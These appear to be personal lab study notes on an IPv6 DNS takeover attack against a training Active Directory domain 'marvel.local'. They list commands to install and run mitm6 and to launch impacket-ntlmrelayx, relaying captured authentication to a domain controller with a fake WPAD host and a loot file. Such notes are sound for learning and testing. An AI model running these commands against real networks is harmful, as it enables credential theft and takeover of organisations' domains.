# On Kali
---
- Setting up mitm6:
	- `git clone https://github.com/dirkjanm/mitm6.git`
	- `python3 -m venv mitm6_env`
	- `source mitm6_env/bin/activate`
	- `pip install -r requirements.txt`
	- Add this in `mitm6.py` file as we are using VPN:
		- ![[Pasted image 20250329024836.png]]
- `sudo python3 mitm6.py -d marvel.local`
	- d -> domain name
	- ![[Pasted image 20250329024902.png]]

- Start `impacket-ntlmrelayx` as:
	- Needs `DC` IP
	- `impacket-ntlmrelayx -6 -t ldaps://10.0.8.4 -wh fakewpad.marvel.local -l lootme`
		- `6` -> IPv6
		- `-t` -> target
		- `-wh` -> wpad
		- `-l` -> lootfile